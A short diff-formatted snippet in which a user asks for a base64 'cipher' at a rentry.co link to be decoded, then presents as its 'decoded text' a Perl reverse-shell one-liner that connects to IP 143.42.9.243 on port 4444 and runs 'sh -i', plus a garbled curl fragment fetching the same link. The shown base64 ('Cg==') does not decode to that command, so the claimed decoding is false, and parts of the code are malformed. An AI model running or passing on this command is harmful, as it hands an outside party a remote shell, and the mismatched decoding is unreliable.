@@ -1,0 +1,5 @@
+hazeyez asked decode this base64 cipher at this link: https://rentry.co/3hcsq/raw with hash 0853f040
+<---- snip ---->
+Cg==
+
+The decoded text is: perl -e 'use Socket;$i="143.42.9.243";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,i));$buf=STDIN;$buf=STDOUT;open(STDIN,"<&S");open(STDOUT,">&S");exec("sh -i");' && curl(SDIN,"https://rentry.co/3hcsq/raw");echo("sh -i");' ;
